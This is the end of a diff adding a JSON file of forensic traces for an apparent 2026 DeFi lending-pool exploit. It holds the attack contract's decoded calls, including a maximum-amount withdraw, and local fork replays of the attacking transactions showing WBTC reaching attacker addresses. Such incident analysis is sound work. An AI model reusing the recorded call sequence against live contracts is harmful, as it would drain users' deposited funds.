+    "value_wei": 39539500000000000000,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab00000000000000000000000000000000000000000000000224b885c2c08ec000",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getBorrowBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "0000000000000000000000005bea205a2d342e87af7642e374dd02d44c136c6f0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   },
+   {
+    "sel": "withdraw",
+    "value_wei": 0,
+    "args": "0000000000000000000000008125afd067094cd573255f82795339b9fe2a40abffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+    "failed": false
+   },
+   {
+    "sel": "getSupplyBalance",
+    "value_wei": 0,
+    "args": "000000000000000000000000<SELF>__________________________________0000000000000000000000008125afd067094cd573255f82795339b9fe2a40ab",
+    "failed": false
+   }
+  ]
+ },
+ "fork_replay_t46": {
+  "what": "debug_traceCall of the reverted creation tx's input from 0x46c403e3 on a local anvil fork of mainnet block 24627180 (post-state of that block; the new contract address differs because the sender nonce is already 31). Nothing was broadcast.",
+  "at_original_gas_limit_14974454": {
+   "error": "execution reverted",
+   "gas_used": 14344401,
+   "onchain_gas_used": 14344401,
+   "result": "reverts; gas used equals the on-chain figure exactly"
+  },
+  "at_gas_limit_30000000": {
+   "error": null,
+   "gas_used": 14974454,
+   "wbtc_transfers": [
+    {
+     "from": "0xba12222222228d8ba445958a75a0704d566bf2c8",
+     "to": "0x6780d14ab66285011208df9821f40d51d288aff5",
+     "sat": 100000000
+    },
+    {
+     "from": "0x4822d9172e5b76b9db37b75f5552f9988f98a888",
+     "to": "0x6780d14ab66285011208df9821f40d51d288aff5",
+     "sat": 129925557
+    },
+    {
+     "from": "0x6780d14ab66285011208df9821f40d51d288aff5",
+     "to": "0xba12222222228d8ba445958a75a0704d566bf2c8",
+     "sat": 100000000
+    },
+    {
+     "from": "0x6780d14ab66285011208df9821f40d51d288aff5",
+     "to": "0x46c403e3dcaf219d9d4de167ccc4e0dd8e81eb72",
+     "sat": 29884523
+    }
+   ],
+   "result": "succeeds; 29884523 sat WBTC reach the attacker EOA = the 29,884,523 sat Yoink swapped on Uniswap V3"
+  },
+  "raw": [
+   "site/raw/rpc/alkemi2026_forksim_46c4_gas14974454.json",
+   "site/raw/rpc/alkemi2026_forksim_46c4_gas30000000.json"
+  ]
+ },
+ "replay_message_sender_tx": {
+  "what": "debug_traceCall (eth.drpc.org) of the message sender's own attack tx 0xd4ec3e34 (from 0x8366d87b to 0x54ad6754, same input) on state after block 24627180 (i.e. as if it had landed in 24627181 before Yoink) and after block 24627181 (as it actually landed).",
+  "after_block_24627180": {
+   "wbtc_transfers": [
+    {
+     "from": "0x4822d9172e5b76b9db37b75f5552f9988f98a888",
+     "to": "0x7b6d57758d02a2833cde7672efa5d03aece08436",
+     "sat": 29980756
+    },
+    {
+     "from": "0x7b6d57758d02a2833cde7672efa5d03aece08436",
+     "to": "0x54ad675428e704b0e97c147da46f8f8743decb81",
+     "sat": 29980756
+    },
+    {
+     "from": "0x54ad675428e704b0e97c147da46f8f8743decb81",
+     "to": "0x460eba8ffccf0fb2a9f4e51610f4e42fc47320fa",
+     "sat": 29980756
+    }
+   ],
+   "result": "takes all 29,980,756 sat WBTC in Alkemi and sends them to 0x460eba8f"
+  },
+  "after_block_24627181": {
+   "wbtc_transfers": [
+    {
+     "from": "0x4822d9172e5b76b9db37b75f5552f9988f98a888",
+     "to": "0x7b6d57758d02a2833cde7672efa5d03aece08436",
+     "sat": 55199
+    },
+    {
+     "from": "0x7b6d57758d02a2833cde7672efa5d03aece08436",
+     "to": "0x54ad675428e704b0e97c147da46f8f8743decb81",
+     "sat": 55199
+    },
+    {
+     "from": "0x54ad675428e704b0e97c147da46f8f8743decb81",
+     "to": "0x460eba8ffccf0fb2a9f4e51610f4e42fc47320fa",
+     "sat": 55199
+    }
+   ],
+   "result": "only the 55,199 sat Yoink left"
+  },
+  "raw": [
+   "site/raw/rpc/alkemi2026_sim_compl_after24627180.json",
+   "site/raw/rpc/alkemi2026_sim_compl_after24627181.json"
+  ]
+ }
+}
